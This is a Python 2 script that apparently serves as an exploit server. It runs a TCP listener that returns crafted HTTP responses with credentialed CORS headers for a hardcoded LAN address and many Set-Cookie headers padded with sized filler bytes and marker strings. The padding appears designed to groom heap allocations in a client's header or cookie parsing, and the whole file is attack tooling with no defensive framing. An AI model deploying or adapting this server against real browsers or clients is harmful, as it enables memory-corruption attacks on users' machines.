# -*- coding: utf-8 -*-

import os
import socket
import struct
import SocketServer

from time import localtime, strftime

class TCServer :

    CORS_IP = ""
    PAY_SIZE = ( (0x38 + 0x20) / 2 ) - 4
    DIGIT = 0
    DIGIT2 = 0
    RQS = 0

    class __handler( SocketServer.BaseRequestHandler ) : 

            def __set_payload( self, data , cors_ip , cors_hdr = 0 ) : 
 
                data_time = strftime( "%a, %d %b %Y %H:%M:%S", localtime( ) )
                data_len  = len( data )

                r = (
                     "HTTP/1.1 200 OK\r\n"
                     "Server: Apache\r\n"
                     "Content-Type: text/html; charset=utf-8\r\n"
                     "Cache-Control: no-cache, no-store, must-revalidate\r\n"
                     "Date: " + str( data_time ) + "\r\n"
                     "Content-Length: " + str( data_len ) + "\r\n"
                     "Access-Control-Allow-Origin: http://" + cors_ip + "\r\n"
                     "Access-Control-Allow-Credentials: true\r\n"
                    )

                if ( cors_hdr == 1 ) :
                     r = r + "Access-Control-Allow-Headers: Orgin\r\n"
                else : 
                    r = r + "Set-Cookie: " + str( TCServer.DIGIT ).zfill( 2 ) + "ECHO0O" + "\x41" * int(TCServer.PAY_SIZE - 7 * 2)  #1 #unicocde(䅁)
                    TCServer.DIGIT = TCServer.DIGIT + 1
                    r = r + "=" + str( TCServer.DIGIT ).zfill( 2 ) + "ECHO1O" + "\x41" * int(TCServer.PAY_SIZE - 7 * 2 ) + "; path=/" + str( TCServer.DIGIT2 ).zfill( 2 ) + "\x42" * int(TCServer.PAY_SIZE - 4) +"/ \r\n" #2, 3, jeśli wartości są unikatowe to 4,5,6 alokacji per header
                    TCServer.DIGIT = TCServer.DIGIT + 1
                    TCServer.DIGIT2 = TCServer.DIGIT2 + 1
                    r = r + "Set-Cookie: " + str( TCServer.DIGIT ).zfill( 2 ) + "\x41" * int(TCServer.PAY_SIZE)  #4
                    TCServer.DIGIT = TCServer.DIGIT + 1
                    TCServer.DIGIT2 = TCServer.DIGIT2 + 1
                    r = r + "=" + str( TCServer.DIGIT ).zfill( 2 ) + "ECHO2O" + "\x41" * int(TCServer.PAY_SIZE - 7 * 2) + "; path=/" + str( TCServer.DIGIT2 ).zfill( 2 ) + "\x43" * int(TCServer.PAY_SIZE - 4) +"/ \r\n" #5, 6
                    TCServer.DIGIT = TCServer.DIGIT + 1
                    r = r + "Set-Cookie: " + str( TCServer.DIGIT ).zfill( 2 ) + "\x41" * int(TCServer.PAY_SIZE) 
                    TCServer.DIGIT = TCServer.DIGIT + 1
                    TCServer.DIGIT2 = TCServer.DIGIT2 + 1
                    r = r + "=" + str( TCServer.DIGIT ).zfill( 2 ) + "ECHO3O" + "\x41" * int(TCServer.PAY_SIZE - 7 * 2) + "; path=/" + str( TCServer.DIGIT2 ).zfill( 2 ) + "\x44" * int(TCServer.PAY_SIZE - 4) +"/ \r\n" 

                r = r + "Connection: Close\r\n\r\n" + data

                return r
      
            def handle( self ) :
 
                if( TCServer.RQS > 1 ) :  #0||1
                   return

                rq_data = self.request.recv( 1024 )
            
                if ( "OPTIONS" in rq_data ) :
                    allow_hdr = 1
                elif ( "GET" not in rq_data ) : 
                	TCServer.RQS = TCServer.RQS + 1
                	allow_hdr = 0

                rs_data = self.__set_payload( "<h1>hi!</h1>", TCServer.CORS_IP, allow_hdr );
                print rs_data
                self.request.sendall( rs_data )


            def handle_error( self, request, client_address ) :

                return

            def log_message(self, format, *args) : 
               
                return

    ''' ******************************************************************** '''

    def __init__( self, bind_addr, bind_port, pay_size, cors_ip ) :

        self.server = None
        self.addr = bind_addr
        self.port = int( bind_port )
        TCServer.CORS_IP = cors_ip
        TCServer.PAY_SIZE = pay_size

    def __del__( self ) :
        if ( self.server != None ) :
            try :
                self.server.shutdown( )
            except :
                    pass
            self.server.server_close( )

    def listen( self ) :
        try : 
            SocketServer.TCPServer.allow_reuse_address = True
            self.server = SocketServer.TCPServer(( self.addr, self.port ), self.__handler )
            SocketServer.TCPServer.allow_reuse_address = True
            return True
        except Exception as e:
               return False

    def run( self ) :
        try :
            while ( True ) :
                    self.server.handle_request( ) 
        except Exception as e:
                return False


server = TCServer( "0.0.0.0", 8484, ( (0x38 + 0x20) / 2 ), "192.168.0.14" )
server.listen( )
server.run( )
